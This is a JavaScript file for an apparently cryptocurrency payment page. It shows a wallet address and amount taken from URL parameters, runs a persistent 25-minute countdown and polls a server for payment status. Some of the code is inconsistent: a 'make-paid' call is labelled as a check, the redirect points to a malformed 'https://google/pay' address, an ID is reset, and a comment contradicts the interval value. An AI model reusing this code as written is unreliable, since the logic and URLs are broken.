/* Copy to clipboard */

var btn = document.getElementById("copy");
var copyed = document.getElementById("copyed");

btn.onclick = function () {
	document.getElementById("wallet").select();
	document.execCommand("copy");
	copyed.style.opacity = "1";
	setTimeout(function () {
		copyed.style.opacity = "0";
	}, 2000);
}



/* Countdown timer */

 /* Countdown timer */
    
    function getTimeRemaining(endtime, now) {
	var t = Date.parse(endtime) - Date.parse(now);
	var seconds = Math.floor((t / 1000) % 60);
	var minutes = Math.floor((t / 1000 / 60) % 60);
	var hours = Math.floor((t / (1000 * 60 * 60)) % 24);
	var days = Math.floor(t / (1000 * 60 * 60 * 24));
	return {
		'total': t,
		'days': days,
		'hours': hours,
		'minutes': minutes,
		'seconds': seconds
	};
}

function initializeClock(id, endtime, now) {
	var clock = document.getElementById(id);
	var daysSpan = clock.querySelector('.days');
	var hoursSpan = clock.querySelector('.hours');
	var minutesSpan = clock.querySelector('.minutes');
	var secondsSpan = clock.querySelector('.seconds');

	function updateClock() {
		
		now = new Date(Date.parse(now) + 1000);
		var t = getTimeRemaining(endtime, now);
		daysSpan.innerHTML = t.days;
		hoursSpan.innerHTML = ('0' + t.hours).slice(-2);
		minutesSpan.innerHTML = ('0' + t.minutes).slice(-2);
		secondsSpan.innerHTML = ('0' + t.seconds).slice(-2);

		if (t.total <= 0) {
			clearInterval(timeinterval);
		}
	}

	updateClock();
	var timeinterval = setInterval(updateClock, 1000);
}


    var deadline;

    // Проверяем наличие сохраненного времени в localStorage
    if (localStorage.getItem('deadline')) {
        // Если есть, устанавливаем сохраненное время в deadline
        deadline = new Date(localStorage.getItem('deadline'));
    } else {
        // Если нет, создаем новое время deadline
        var now = new Date();
        now.setMinutes(now.getMinutes());
        deadline = new Date(now.getTime() + 25 * 60 * 1000);
        // Сохраняем deadline в localStorage
        localStorage.setItem('deadline', deadline);
    }

    // Получаем параметры из URL
    var urlParams = new URLSearchParams(window.location.search);
    var wallet = urlParams.get('wallet');
    var sum = urlParams.get('sum');

    // Устанавливаем значения для элементов формы
    document.getElementById("wallet").value = wallet;
    document.getElementsByName("sum")[0].value = sum;

    // Инициализируем часы обратного отсчета
    var now = new Date();
    initializeClock('countdown', deadline, now);

    // Устанавливаем идентификатор
    window._id = 1;

    // Проверяем, оплачен ли заказ
    checkPaid();

    // Сохраняем deadline в localStorage каждые 5 секунд
    setInterval(function() {
        localStorage.setItem('deadline', deadline);
    }, 3000);


window._id = 0;

function paid() {
		setInterval(function() {
			$.ajax({
				url: '/ajax.php',
				method: 'POST',
				data: {
					id: window._id,
					url: '/pay/check'
				},
				dataType: 'json',
				success: function(data) {
					if(data.result == 1) {
						if(data.status == 2) {
							window.location.href = 'https://google/pay/' + window._id + '/return';
						} else if(data.status == 3 || data.status == 4 || data.status == 5 || data.status == 6) {
							window.location.href = 'https://google/pay/' + window._id + '/return';
						}
					}
				}
			})
		}, 5000);
	}

function checkPaid() {
	$.ajax({
		url: '/ajax.php',
		method: 'POST',
		data: {
			id: window._id,
			url: '/pay/make-paid'
		},
		dataType: 'json',
		success: function(data) {
			if(data.result == 1) {
				paid();
			}
		}
	})
}

//var deadline = new Date(Date.parse(new Date()) + 1 * 1 * 20 * 60 * 1000); // for endless timer
//initializeClock('countdown', deadline);


